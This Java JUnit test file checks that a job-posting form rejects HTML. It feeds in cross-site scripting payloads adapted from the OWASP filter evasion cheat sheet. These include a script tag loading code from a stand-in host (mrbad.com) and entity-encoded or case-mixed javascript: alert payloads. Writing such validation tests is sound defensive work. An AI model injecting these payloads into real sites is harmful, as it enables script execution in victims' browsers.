package group1.test;

import group1.helpers.JobValidationParameterised;
import java.util.Arrays;
import java.util.Collection;
import org.junit.runner.RunWith;
import org.junit.runners.Parameterized;
import org.junit.runners.Parameterized.Parameters;

/**
 * Class to validate all the items are not vulnerable to a cross site scripting
 * attack by inputing malicious HTML.
 * Complements and depends on the JobValidationTest test cases, specifically the
 * JobValidationTest.validJob() method.
 *
 * @author Daniel Searle <ds00148@surrey.ac.uk>
 */
@RunWith(Parameterized.class)
public class JobXSSStringTest extends JobValidationParameterised {

    /**
     * Parameterised test data generator, returns a list of strings which should
     * be considered as cross site scripting attacks. This is not an exhaustive
     * list as all HTML should be considered as incorrect entry. The
     * data in this list is inspired by the OWASP XSS filter evasion cheat sheet
     * from https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
     * @return Collection of strings which should be considered html entry.
     */
    @Parameters(name = "{0}")
    public static Collection<Object[]> generateData() {
        return Arrays.asList(new Object[][] {
            { "<h1>Title</h1>" }, // Simple html tags should be removed
            { "<script src=http://mrbad.com/xss.js></script>" }, // Simple script tag
            { "<img src=javascript:alert('XSS');>" }, // Using img to execute javascript
            { "<ImG SrC=JaVaScRiPt:alert('XSS');>" }, // Case senstive filter test
            { "<img src=`javascript:alert('XSS')`>" }, // Use of grave accents
            { "<img \"\"\"><script>alert('XSS')</script>\">" }, // Malformed image tag to inject script
            { "<img src=javascript:alert(String.fromCharCode(88,83,83))>" }, // Create quotes using JS
            { "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>" },
               // UTF-8 encoding of script tag
            { "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> "},
               // Long UTF-8 encoding
            { "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>" },
               // Hex encoding
        });
    }

    /**
     * Constructor to call the super constructor with the string test data.
     * @param testData String to test through the field.
     */
    public JobXSSStringTest(String testData) {
        super(testData);
    }

}
